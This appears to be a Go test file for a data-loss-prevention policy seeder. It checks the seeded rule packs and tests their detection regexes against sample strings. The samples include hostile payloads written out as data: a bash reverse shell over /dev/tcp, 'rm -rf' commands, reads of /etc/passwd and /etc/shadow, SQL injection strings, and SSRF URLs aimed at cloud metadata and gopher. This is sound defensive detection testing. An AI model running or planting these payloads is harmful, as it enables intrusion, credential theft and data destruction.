package policy

import (
	"context"
	"regexp"
	"testing"
)

func TestSeeder(t *testing.T) {
	store := setupTestStore(t)
	ctx := context.Background()

	// 1. Initial Seed
	if err := Seed(ctx, store); err != nil {
		t.Fatalf("Seed failed: %v", err)
	}

	// Verify all 10 packs exist
	packs, err := store.ListPacks(ctx)
	if err != nil {
		t.Fatalf("ListPacks failed: %v", err)
	}
	const expectedPackCount = 10
	if len(packs) != expectedPackCount {
		t.Fatalf("expected %d seeded packs, got %d", expectedPackCount, len(packs))
	}

	expectedPackIDs := map[string]bool{
		"pack:tr-kvkk":           false,
		"pack:qa-qcb":            false,
		"pack:eu-gdpr":           false,
		"pack:us-privacy":        false,
		"pack:cloud-infra":       false,
		"pack:saas-tokens":       false,
		"pack:db-sanitization":   false,
		"pack:command-injection": false,
		"pack:path-traversal":    false,
		"pack:ssrf-defense":      false,
	}
	for _, p := range packs {
		if _, ok := expectedPackIDs[p.ID]; ok {
			expectedPackIDs[p.ID] = true
		}
	}
	for id, found := range expectedPackIDs {
		if !found {
			t.Errorf("pack %s was not found in seeded packs", id)
		}
	}

	// 2. Verify Idempotence: Second and third Seed calls must succeed without duplicates
	if err := Seed(ctx, store); err != nil {
		t.Fatalf("second Seed call failed: %v", err)
	}
	if err := Seed(ctx, store); err != nil {
		t.Fatalf("third Seed call failed: %v", err)
	}

	packsAfterReSeed, err := store.ListPacks(ctx)
	if err != nil {
		t.Fatalf("ListPacks after re-seed failed: %v", err)
	}
	if len(packsAfterReSeed) != expectedPackCount {
		t.Fatalf("expected %d packs after re-seed, got %d", expectedPackCount, len(packsAfterReSeed))
	}

	// 3. Verify all rule patterns compile, have CWE & Severity, and match intended payloads
	allRules, err := store.ListRules(ctx, "")
	if err != nil {
		t.Fatalf("ListRules failed: %v", err)
	}
	if len(allRules) < 40 {
		t.Fatalf("expected at least 40 seeded rules, got %d", len(allRules))
	}

	ruleMap := make(map[string]DlpPatternRule, len(allRules))
	for _, r := range allRules {
		ruleMap[r.ID] = r
		// Compile check
		if _, err := regexp.Compile(r.Regex); err != nil {
			t.Errorf("regex for rule %s failed to compile: %v", r.ID, err)
		}
		// CWE & Severity integrity check
		if r.CWE == "" {
			t.Errorf("rule %s has empty CWE", r.ID)
		}
		if r.Severity == "" {
			t.Errorf("rule %s has empty Severity", r.ID)
		}
	}

	// 4. Pattern matching table-driven tests
	matchTests := []struct {
		name        string
		ruleID      string
		sample      string
		shouldMatch bool
	}{
		// Turkey KVKK
		{"TCKN valid", "rule:tr-tckn", "Kullanıcının kimlik numarası 12345678901 olarak belirlendi", true},
		{"TCKN starts with 0", "rule:tr-tckn", "02345678901", false},
		{"TCKN short", "rule:tr-tckn", "12345", false},
		{"Turkey Phone valid intl", "rule:tr-phone", "+905321234567", true},
		{"Turkey Phone valid dash", "rule:tr-phone", "0555-123-45-67", true},

		// Qatar QCB
		{"Qatar QID valid", "rule:qa-qid", "Customer QID: 28412345678", true},
		{"Qatar QID invalid start", "rule:qa-qid", "18412345678", false},

		// EU GDPR
		{"EU Email valid", "rule:eu-email", "Contact us at support@example.com for help", true},
		{"EU Email invalid", "rule:eu-email", "not-an-email", false},

		// Cloud Secrets
		{"AWS Access Key valid", "rule:cloud-aws-key", "AKIAIOSFODNN7EXAMPLE", true},
		{"AWS Access Key invalid", "rule:cloud-aws-key", "INVALID_PREFIX_0000", false},
		{"Cloud JWT valid", "rule:cloud-jwt", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.doNotLeakThisSignature123", true},

		// DB Sanitization
		{"DB Conn URI valid", "rule:db-conn-string", "postgres://admin:SuperSecretPass123!@db.internal:5432/production", true},
		{"SQLi Tautology valid", "rule:db-sql-tautology", "' OR 1=1 --", true},
		{"SQLi Union valid", "rule:db-sql-union", "SELECT id FROM users UNION SELECT password FROM admins", true},
		{"SQLi Stacked valid", "rule:db-sql-stacked", "; DROP TABLE users", true},
		{"SQLi Blind Delay valid", "rule:db-sql-blind-delay", "SELECT * FROM users WHERE id = 1 AND SLEEP(5)", true},
		{"SQLi Dump Query valid", "rule:db-dump-query", "SELECT table_name FROM information_schema.tables", true},

		// Command Injection (FAB)
		{"Cmd Chaining Pipe cat", "rule:cmd-chaining-pipe", "; cat /etc/passwd", true},
		{"Cmd Chaining Pipe rm", "rule:cmd-chaining-pipe", "&& rm -rf /tmp/data", true},
		{"Cmd Substitution $(...)", "rule:cmd-substitution", "echo $(whoami)", true},
		{"Cmd Substitution `...`", "rule:cmd-substitution", "echo `id`", true},
		{"Cmd Reverse Shell", "rule:cmd-reverse-shell", "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", true},
		{"Cmd Destructive rm", "rule:cmd-destructive-rm", "rm -rf /var/log/*", true},

		// Path Traversal (FAB)
		{"Path Dot Dot", "rule:path-dot-dot", "../../../../etc/shadow", true},
		{"Path Encoded", "rule:path-encoded", "..%2f..%2f..%2fetc%2fpasswd", true},
		{"Path Sensitive Unix", "rule:path-sensitive-unix", "/etc/passwd", true},
		{"Path Windows System", "rule:path-windows-system", "C:\\Windows\\System32\\cmd.exe", true},

		// SSRF Defense (FAB)
		{"SSRF AWS IMDS", "rule:ssrf-cloud-metadata", "http://169.254.169.254/latest/meta-data/", true},
		{"SSRF Loopback", "rule:ssrf-loopback-private", "http://127.0.0.1:8080/internal/admin", true},
		{"SSRF Scheme gopher", "rule:ssrf-dangerous-schemes", "gopher://127.0.0.1:6379/_flushall", true},

		// SaaS Tokens (FAB)
		{"Token OpenAI", "rule:token-openai", "sk-proj-abc123456789012345678901234567890123456789012345", true},
		{"Token GitHub PAT", "rule:token-github-pat", "ghp_123456789012345678901234567890123456", true},
		{"Token Stripe", "rule:token-stripe", "sk_live_123456789012345678901234", true},

		// US Privacy (FAB)
		{"US SSN valid", "rule:us-ssn", "SSN: 123-45-6789", true},
		{"US SSN invalid short", "rule:us-ssn", "SSN: 12-45-6789", false},
		{"US SSN invalid letters", "rule:us-ssn", "SSN: 12A-45-6789", false},
	}

	for _, tt := range matchTests {
		t.Run(tt.name, func(t *testing.T) {
			r, exists := ruleMap[tt.ruleID]
			if !exists {
				t.Fatalf("rule %s not found in store", tt.ruleID)
			}
			re := regexp.MustCompile(r.Regex)
			matched := re.MatchString(tt.sample)
			if matched != tt.shouldMatch {
				t.Errorf("rule %s MatchString(%q) = %v; want %v", tt.ruleID, tt.sample, matched, tt.shouldMatch)
			}
		})
	}
}
